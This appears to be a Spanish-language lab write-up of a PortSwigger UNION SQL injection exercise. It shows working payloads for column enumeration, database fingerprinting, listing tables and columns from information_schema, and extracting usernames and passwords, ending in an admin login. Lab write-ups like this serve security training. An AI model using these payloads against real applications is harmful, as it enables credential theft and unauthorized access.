# SQL Injection UNION Attack - Retrieving Data From Other Tables

## 📌 Lab Information

- **Lab:** Retrieving Data From Other Tables
- **Categoría:** UNION SQL Injection

🔗 [Acceder al laboratorio](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables)

---

## 🎯 Objetivo

Extraer usuarios y contraseñas desde otra tabla de la base de datos.

---

## 🔍 Enumeración de columnas

```sql
' order by 2 -- -
```

![Enumeración columnas](./Imagenes/pasted-image-20260403204953.png)

---

## 🔍 Validación de columnas visibles
```sql
' union select 'a','b' -- -
```

![Validación columnas](./Imagenes/pasted-image-20260403205119.png)

---

## 🔍 Identificación del motor

Probamos MySQL/Microsoft:

```sql
@@version
```

Error.

Probamos PostgreSQL:

```sql
version()
```

![Versión PostgreSQL](./Imagenes/pasted-image-20260403205344.png)

---

## 🚀 Listado de tablas

```sql
' union select table_name,null from information_schema.tables -- -
```

![Listado tablas](./Imagenes/pasted-image-20260403205509.png)

---

## 🔍 Tabla users

![Tabla users](./Imagenes/pasted-image-20260403205615.png)

---

## 🚀 Listado de columnas

```sql
' union select column_name,null from information_schema.columns where table_name='users' -- -
```

![Columnas users](./Imagenes/pasted-image-20260403205757.png)

---

## 🚀 Extracción de credenciales

```sql
' union select username,password from users -- -
```

![Credenciales](./Imagenes/pasted-image-20260403205933.png)

---

## 🔓 Acceso administrador

![Login administrador](./Imagenes/pasted-image-20260403210026.png)

---

## ✅ Resultado

Se logró:
- Enumerar tablas
- Enumerar columnas
- Extraer credenciales
- Acceder como administrador
